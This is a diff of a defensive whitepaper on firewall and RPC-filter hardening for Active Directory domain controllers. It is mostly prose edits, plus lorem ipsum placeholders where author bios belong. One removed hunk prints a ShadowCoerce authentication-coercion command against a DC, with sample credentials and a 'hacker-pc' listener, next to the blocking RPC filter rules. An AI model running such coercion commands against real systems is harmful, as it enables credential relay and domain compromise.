@@ -86,48 +86,53 @@ footer-right: "\\hspace{1cm}"
 
 ## Summary
 
-> [!NOTE]
-> TODO: The Summary section needs to be expanded.
-
-Windows Firewall with Advanced Security might be tricky to configure securely and it is usually disabled or left open for all trafic in many organizations.
-
-The purpose of this project is to simplify the deployment of a specific set of firewall rules and filters that can
-significantly reduce the attack surface of Domain Controllers without impacting the functionality of Active Directory.
-
-The following guideline is comprehensive source of Windows Firewall related information and aims to provide you with detailed information about Windows Firewall configuration options, network protocols, configuration caveats, possible attacks, but above all should provide guidance how to configure Windows Firewall with Advanced Security in your environment securely. 
-
-To streamline the process, we offer the `DCFWTool`, that provides a flexible and repeatable way to deploy a secure configuration in the environment within minutes. All the `DCFWTool` configuration options are described in the following chapters.
+Windows Firewall with Advanced Security can sometimes be tricky to configure securely.
+As a consequence, it is usually disabled or left open for all trafic in many organizations.
+The *Domain Controller Firewall* project therefore aims to simplify the deployment of a specific set of firewall rules
+and RPC filters that can significantly reduce the attack surface of Domain Controllers (DCs),
+without impacting the functionality of Active Directory (AD).
 
 ![Windows Firewall with Advanced Security](../Images/Screenshots/dc-firewall.png)
 
+The purpose of this whitepaper is to serve as a comprehensive source of Windows Firewall related information.
+It includes detailed information about Windows Firewall configuration options, network protocols,
+configuration caveats, and network-based attacks. Most importantly, it provides guidance on configuring
+Windows Firewall with Advanced Security in enteprise environments to make them more secure.
+
+To streamline the host-based firewall configuration process, we have also created the `DCFWTool` as part of this project.
+This PowerShell-based tool provides a flexible and repeatable way
+of deploying a secure DC firewall configuration within minutes.
+The functionality and configuration options of the `DCFWTool` are described in this document as well.
+
 [![](../Images/Badges/license-mit.png)](https://github.com/MichaelGrafnetter/active-directory-firewall/blob/main/LICENSE)
+
+> [!NOTE] This document only focuses on the configuration of domain controller firewalls.
+> It is further expected that DCs are only running the recommended set of roles, such as ADDS, DNS, and NTP server.
+> Additional Windows Server roles, as well as management, backup, or logging agents, are out of the scope of this whitepaper. 
+> This document also does not cover a broader DC hardening strategy.
+
+## About the Authors
+
+This whitepaper was written by [Pavel Formánek](https://en.linkedin.com/in/pavel-formanek-9861397)
+and [Michael Grafnetter](https://en.linkedin.com/in/grafnetter),
+both of whom used to work as Identity and Security Premier Field Engineers (PFEs) at Microsoft.
+
+> [!NOTE]
+> TODO: Add bio.
+
+![](../Images/Profile/michael-grafnetter.jpg) Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.
+
+![](../Images/Profile/pavel-formanek.jpg) Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.
 
 ## Design
 
-### Key Design Decisions
+### Overview
 
-- The tool has been tested on Windows Server 2022 and Windows 11, but it should work on all versions of Windows Server
-  and Windows clients currently supported by Microsoft.
-- The firewall rules are designed with the assumption that you can define the following groups of IP addresses
-  or network ranges:
-    - **Client network** (servers and client computers)
-    - **Management network** (endpoints used for Tier 0 administration)
-    - **Domain Controller network** (all DCs in your forest)
-- These rules are specifically designed for Domain Controllers and not for servers or client machines.
-  It is expected that the DCs are only running the recommended set of roles, such as ADDS, DNS, and NTP server.
-  No other roles have been tested.
-- The rules are intended for DCs configured with **static IP addresses**, as recommended by Microsoft.
-- The rules do not include configuration for SCOM, Backup agents, Log agents (except WEF push configuration),
-  or any other custom agents running on DCs.
-- The configuration focuses solely on Firewall rules and **does not include IPSec rules** or DC hardening settings,
-  except for disabling several multicast services like LLMNR or mDNS.
-- The configuration enforces GPO firewall rules only, meaning that any **local configurations on individual DCs will be
-  ignored** during firewall rule evaluation.
-- Only **Inbound rules** are configured and enforced.
-- The configuration does not differentiate between the Domain, Private, and Public firewall profiles to avoid
-  potential DC unavailability in case of incorrect network type detection by NLA.
-- Many services that typically use dynamic ports are configured with **static port numbers** by the tool.
-  This allows for easier tracing and troubleshooting at the network level and simplifies rule configuration for network firewalls.
+There are many decisions one needs to make when designing a firewall policy for domain controllers.
+This chapter contains general recommendations on Windows Firewall configuration, including the reasoning behind them.
+
+When creating your own DC firewall policy, you do not need to start from scratch. Instead, you can use the `DCFWTool`,
+which will generate a GPO implementing all these recommendations.
 
 ### Host-Based Firewall vs Network-Based Firewall
 
@@ -153,7 +158,7 @@ There are several security issues with this approach:
 The best-practice is thus to configure both the network-based firewall and host-based firewall. Internet traffic should
 additionally be filtered by proxy servers.
 
-This paper only focuses on secure configuration of host-based firewalls, i.e., Windows Defender Firewall
+This whitepaper only focuses on secure configuration of host-based firewalls, i.e., Windows Defender Firewall
 with Advanced Security, on domain controllers. However, the [Inbound Firewall Rules Reference](#inbound-firewall-rules-reference)
 chapter might also serve as information source for configuring network-based firewalls.
 
@@ -161,24 +166,49 @@ chapter might also serve as information source for configuring network-based fir
 
 As the Windows Firewall does not provide the ability create named IP address sets, e.g., Management VLANs,
 manual (re)configuration of firewall rules and their source IP address ranges is cumbersome and error-prone.
-It is therefore recommended to use PowerShell scripts to manage Windows Firewall rules, which is what the `DCFWTool` does.
+We have additionally noticed that port numbers are sometimes mangled while copying firewall rules between policy objetcs.
+It is therefore strongly recommended to use PowerShell scripts to manage Windows Firewall rules,
+which is what the `DCFWTool` does.
+
+### Static IP Addresses
+
+Domain controllers should be configured with **static IP addresses**, as recommended by Microsoft.
+Failure to do so might cause network outages and would further complicate the firewall configuration.
+The firewall rule set described in this document therefore does not cover the DHCP client traffic.
 
 ### Firewall Rule Merging
 
-As mentioned in the [Key Design Decisions](#key-design-decisions) section, the set of rules is only prepared
-for DC-related roles and are is adjusted for various agents or non-standard roles running on a DC.
-If you need to add additional firewall rules for your environment (DC agents, SCCM management, etc.),
-it is recommended to create separate GPO and define all the custom rules there.
-Firewall rules, which are finally configured on a DC, are the outcome of all the rules merged from all the applied GPOs.
+To ensure the domain controllers are configured in a consistent way,
+their host-based firewalls should be managed centrally through a GPO.
+Any **local settings on individual DCs should be ignored** during firewall rule evaluation.
+
+This whitepaper and the policy object created by the `DCFWTool` only cover traffic related to domain controllers
+and a few additional Windows Server roles that are often present on DCs.
+If additional environment-specific firewall rules are needed (DC agents, SCCM management, etc.),
+it is recommended to define them in separate GPOs.
+The resulting firewall rule set, which will be honored by the DCs, will contain rules from all GPOs applied to these DCs.
 
 > [!NOTE]
-> Please keep in mind that this whitepaper only focuses on the firewall configuration. It is not a security baseline
-> and it does not cover domain controller security hardening. You should have a separate and dedicated security
-> baseline GPO applied to your DCs.
+> Please keep in mind that this whitepaper only focuses on the firewall configuration
+> and does not cover any other aspects of domain controller security hardening.
+> You should have a separate and dedicated security baseline GPO applied to your DCs.
 
 ![GPO precedence](../Images/Screenshots/firewall-precedence-gpo.png)
 
 ### Identifying Management Traffic
+
+#### Motivation
+
+Any proper DC firewall rule design requires that administrators are able to define the following groups of IP addresses
+or network ranges:
+
+- **Client network** (servers and client computers)
+- **Management network** (endpoints used for Tier 0 administration)
+- **Domain Controller network** (all DCs in the forest)
+
+Ideally, protocols that could be (mis)used for remote command execution, should only be open from the management network(s).
+Similarly, replication traffic should only be allowed to originate from other domain controllers.
+However, not all network protocols can be categorized easily.
 
 #### The Good
 
@@ -292,7 +322,7 @@ Similarly, all of these firewall rules open port `445/TCP` for `System`:
 
 Moreover, both ports 135 and 445 need to be accessible by all Windows clients for Active Directory to function properly.
 To keep the configuration readable, it is reasonable to consolidate the redundant rules,
-and to create a singlefirewall rule for each static port number.
+and to create a single firewall rule for each static port number.
 
 ### Issues with Predefined Address Sets
 
@@ -356,23 +386,21 @@ only English rule names.
 
 ### Firewall Profiles
 
-> [!NOTE]
-> TODO: This section needs to be expanded.
+Windows Firewall differentiates between three network profiles that can be targeted by firewall rules:
 
-Windows Firewall offers three firewall profiles:
-- domain
-- private
-- public
+- The **Domain** profile applies to networks where the host system can authenticate to a domain controller.
+- The **Private** profile is used to designate private or home networks.
+- The **Public** profile is used to designate public networks
+  such as Wi-Fi hotspots at coffee shops, airports, and other locations.
 
-The domain profile applies to networks where the host system can authenticate to a domain controller. The private profile is used to designate private or home networks. Public profile is used to designate public networks such as Wi-Fi hotspots at coffee shops, airports, and other locations.
+Network interfaces of Domain Controllers and other computers on corporate networks
+are automatically assigned the Domain profile.
+However, the assignment of this profile depends on the Microsoft Windows Network Location Awareness (NLA) functioning properly.
+Under specific circumstances, usually during recovery scenarios or complete power outages,
+NLA can improperly detect the network type during the system startup and thus activate a wrong firewall profile.
 
-Domain Controllers and other clients on your corporate network will commonly be assigned domain profile.
-
-Assignment of the profile depends on Microsoft Windows Network Location Awareness (NLA) proper function.
-
-Under specific circumstances, usually during recovery scenarios or complete power outage, NLA can improperly detect the network type during system start and therefore wrong firewall profile might be active. 
-
-`DCFWTool` configures all configured rules in all 3 profiles, to avoid unavailability of a DC in these cases.
+It is therefore highly recommended to configure all firewall rules on DCs to target all 3 network profiles,
+to avoid potential loss of network connectivity.
 
 ![Windows Firewall profiles](../Images/Screenshots/firewall-profiles.png){ width=400px }
 
@@ -381,7 +409,7 @@ Under specific circumstances, usually during recovery scenarios or complete powe
 #### Reasons for Blocking Outbound Traffic
 
 Generally speaking, outbound firewall rules on domain controllers might play an important role in blocking NTLM relay
-to workstations, preventing lateral movement, breaking malware C2 channels, and mitigating the risk of data breaches.
+through workstations, preventing lateral movement, breaking malware C2 channels, and mitigating the risk of data breaches.
 
 On the other hand, all of the [security standards we are familiar with](#security-standards-compliance) state
 that Windows Firewall should allow outbound connections by default.
@@ -406,8 +434,8 @@ logged-on user, making it impossible to target them in service-specific Windows 
 - Cryptographic Services (CryptSvc)
 - Background Intelligent Transfer Service (BITS)
 
-To allow Windows Update to work, one would need to target the `svchost.exe` program in a firewall rule,
-thus allowing all services to connect to remote computers.
+This means that in order to keep Windows Update working, one would need to target the `svchost.exe` program
+in a firewall rule, thus allowing all services to connect to remote computers.
 
 #### Scheduled Tasks with Custom Handlers
 
@@ -492,8 +520,14 @@ As a conclusion, the only viable and secure solution is to deploy 3rd-party Inte
 that would limit the outbound traffic from domain controllers to select FQDNs.
 This list of approved addresses used by Microsoft's services should ideally be kept up-to-date by the proxy vendor.
 
-> [!NOTE]
-> TODO: Network protection, Telemetry, Windows Update P2P
+Some Windows Server components that generate non-essential outbound Internet traffic can easily be turned off.
+For example, many enterprises choose to turn off [telemetry](https://learn.microsoft.com/en-us/windows/privacy/configure-windows-diagnostic-data-in-your-organization)
+and [P2P delivery of Windows updates](https://learn.microsoft.com/en-us/windows/deployment/do/waas-delivery-optimization).
+
+To at least block outbound traffic to known malicious IP addresses and URLs directly on the host,
+it is recommended to turn on the [Network protection](https://learn.microsoft.com/en-us/defender-endpoint/network-protection)
+feature of the built-in Microsoft Defender Antivirus.
+Thus far, we have not noticed any adverse effects of enabling this functionality on domain controllers.
 
 And then there are of course air-gapped (isolated) environments,
 in which the growing number of cloud-dependent Windows Server features will never be used,
@@ -891,46 +925,14 @@ add filter
 
 #### \[MS-FSRVP\]: File Server Remote VSS Protocol
 
-> [!NOTE]
-> The MS-FSVRP part needs expansion.
+The [\[MS-FSRVP\]: File Server Remote VSS Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/dae107ec-8198-4778-a950-faa7edad125b)
+with UUID [a8e0653c-2744-4389-a61d-7373df8b2292](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/92d20000-dcbc-4ec1-bf10-9a38c828436d)
+is exposed by the **File Server VSS Agent Service** optional feature over the [\\PIPE\\FssagentRpc](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/c504c88e-3248-418f-8d83-22ec8f008816)
+named pipe.
 
-[\[MS-FSRVP\]: File Server Remote VSS Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/dae107ec-8198-4778-a950-faa7edad125b)
-
-[a8e0653c-2744-4389-a61d-7373df8b2292](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/92d20000-dcbc-4ec1-bf10-9a38c828436d)
-
-[\\PIPE\\FssagentRpc](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/c504c88e-3248-418f-8d83-22ec8f008816)
-
-File Server VSS Agent Service
-
-[ShadowCoerce](https://github.com/ShutdownRepo/ShadowCoerce)
-
-```shell
-python3 shadowcoerce.py -d contoso -u john -p 'Pa$$w0rd' hacker-pc dc01 
-```
-
-```txt
-MS-FSRVP authentication coercion PoC
-
-[*] Connecting to ncacn_np:dc01[\PIPE\FssagentRpc]
-[*] Connected!
-[*] Binding to a8e0653c-2744-4389-a61d-7373df8b2292
-[*] Successfully bound!
-[*] Sending IsPathSupported!
-[*] Attack may of may not have worked, check your listener...
-```
-
-```txt
-rpc filter
-
-add rule layer=um actiontype=permit filterkey=869a3c6c-60dd-4558-a58b-8d9e86b0da5f
-add condition field=if_uuid matchtype=equal data=a8e0653c-2744-4389-a61d-7373df8b2292
-add condition field=remote_user_token matchtype=equal data=D:(A;;CC;;;DA)
-add filter
-
-add rule layer=um actiontype=block filterkey=4bce314a-d956-41cf-86f1-75067362cae6
-add condition field=if_uuid matchtype=equal data=a8e0653c-2744-4389-a61d-7373df8b2292
-add filter
-```
+In the past this protocol could be abused by the [ShadowCoerce](https://github.com/ShutdownRepo/ShadowCoerce) attack,
+but Microsoft fixed the corresponding vulnerability in [KB5015527](https://support.microsoft.com/en-us/topic/kb5015527-shadow-copy-operations-using-vss-on-remote-smb-shares-denied-access-after-installing-windows-update-dated-june-14-2022-6d460245-08b6-40f4-9ded-dd030b27850b).
+No further action is therefore needed.
 
 #### \[MS-DNSP\]: Domain Name Service (DNS) Server Management Protocol
 
@@ -1038,6 +1040,10 @@ The following protocols need to be investigated in the future, as they are open 
 - [MSRPC-To-ATT&CK](https://github.com/jsecurity101/MSRPC-to-ATTACK)
 - [A Definitive Guide to the Remote Procedure Call (RPC) Filter](https://www.akamai.com/blog/security/guide-rpc-filter#using)
 - [server22_rpc_servers_scrape.csv](https://github.com/akamai/akamai-security-research/blob/main/rpc_toolkit/rpc_interface_lists/server22_rpc_servers_scrape.csv)
+
+### IPSec Rules
+
+
 
 ### Distribution Contents
 
@@ -2424,6 +2430,9 @@ Default value: null
 
 ### Prerequisites
 
+- The tool has been tested on Windows Server 2022 and Windows 11, but it should work on all versions of Windows Server
+  and Windows clients currently supported by Microsoft.
+
 ![](../Images/Badges/windows-server.png) ![](../Images/Badges/windows-client.png)
 
 ![](../Images/Badges/powershell5.png)
@@ -3177,9 +3186,10 @@ the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers
 | Description | Inbound rule for the Remote Desktop service to allow RDP traffic. [UDP 3389] |
 | Remote Addresses | [Management Computers](#managementaddresses), [Domain Controllers](#domaincontrolleraddresses) |
 
-This rule is governed by the [EnableRemoteDesktop](#enableremotedesktop) setting. 
+This rule is governed by the [EnableRemoteDesktop](#enableremotedesktop) setting.
 
-The scope of this rule can further be limited by enabling the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
+The scope of this rule can further be limited by enabling
+the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
 
 #### Remote Desktop - User Mode (TCP-In)
 
@@ -3195,9 +3205,10 @@ The scope of this rule can further be limited by enabling the [BlockManagementFr
 | Description | Inbound rule for the Remote Desktop service to allow RDP traffic. [TCP 3389] |
 | Remote Addresses | [Management Computers](#managementaddresses), [Domain Controllers](#domaincontrolleraddresses) |
 
-This rule is governed by the [EnableRemoteDesktop](#enableremotedesktop) setting. 
+This rule is governed by the [EnableRemoteDesktop](#enableremotedesktop) setting.
 
-The scope of this rule can further be limited by enabling the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
+The scope of this rule can further be limited by enabling
+the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
 
 #### Remote Desktop (TCP-In)
 
@@ -3217,7 +3228,7 @@ The scope of this rule can further be limited by enabling the [BlockManagementFr
 > It was superseded by the [Remote Desktop - User Mode (TCP-In)](#remote-desktop---user-mode-tcp-in) rule
 > in Windows Server 2012.
 
-This rule is governed by the [EnableRemoteDesktop](#enableremotedesktop) setting. 
+This rule is governed by the [EnableRemoteDesktop](#enableremotedesktop) setting.
 
 The scope of this rule
 can further be limited by enabling the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
